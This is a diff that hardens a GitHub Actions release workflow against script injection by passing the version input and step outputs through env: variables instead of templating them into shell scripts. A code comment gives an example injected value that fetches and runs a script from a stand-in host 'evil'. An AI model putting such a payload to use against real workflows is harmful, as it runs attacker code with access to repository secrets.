@@ -28,10 +28,24 @@ jobs:
         with:
           fetch-depth: 0
 
+      # inputs.version is a free-text workflow_dispatch input -- anyone who
+      # can trigger this workflow controls it, and it may contain shell
+      # metacharacters. It's passed via env: rather than spliced into the
+      # script text with ${{ }}: that splicing happens at YAML-templating
+      # time, before bash ever parses the line, so the regex check further
+      # down would run too late to matter against a value like
+      # "1.0.0$(curl evil|sh)" if it were interpolated directly -- the
+      # injected command would already have executed as part of building
+      # the "version=..." assignment itself. Routed through env: and
+      # referenced as "$version", it's just a string value to bash no
+      # matter what it contains, and the regex check is then a real,
+      # effective gate on top of that.
       - name: Validate version, compute tag/branch names
         id: meta
+        env:
+          VERSION_INPUT: ${{ inputs.version }}
         run: |
-          version="${{ inputs.version }}"
+          version="$VERSION_INPUT"
           if ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
             echo "version must be MAJOR.MINOR.PATCH (e.g. 4.0.26), got: $version" >&2
             exit 1
@@ -48,22 +62,26 @@ jobs:
         id: notes
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.meta.outputs.tag }}
         run: |
           # The same "generate release notes" GitHub API release.yml's own
           # publish step uses (via generate_release_notes: true) -- so the
           # PR body previewed here for review is what the actual GitHub
           # Release body will read once this is merged and tagged.
           gh api "repos/${{ github.repository }}/releases/generate-notes" \
-            -f tag_name="${{ steps.meta.outputs.tag }}" -f target_commitish=main \
+            -f tag_name="$TAG" -f target_commitish=main \
             --jq .body > /tmp/notes.md
 
       - name: Prepend a CHANGELOG.md entry on the release branch
+        env:
+          TAG: ${{ steps.meta.outputs.tag }}
+          BRANCH: ${{ steps.meta.outputs.branch }}
         run: |
-          git checkout -b "${{ steps.meta.outputs.branch }}"
+          git checkout -b "$BRANCH"
           {
             echo "# Changelog"
             echo
-            echo "## ${{ steps.meta.outputs.tag }} - $(date -u +%Y-%m-%d)"
+            echo "## $TAG - $(date -u +%Y-%m-%d)"
             echo
             cat /tmp/notes.md
             echo
@@ -73,16 +91,18 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add CHANGELOG.md
-          git commit -m "Prepare release ${{ steps.meta.outputs.tag }}"
-          git push origin "${{ steps.meta.outputs.branch }}"
+          git commit -m "Prepare release $TAG"
+          git push origin "$BRANCH"
 
       - name: Open the release PR
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.meta.outputs.tag }}
+          BRANCH: ${{ steps.meta.outputs.branch }}
         run: |
           gh label create release --color 0e8a16 \
             --description "Release preparation PR" 2>/dev/null || true
-          gh pr create --base main --head "${{ steps.meta.outputs.branch }}" \
-            --title "Release ${{ steps.meta.outputs.tag }}" \
+          gh pr create --base main --head "$BRANCH" \
+            --title "Release $TAG" \
             --body-file /tmp/notes.md \
             --label release
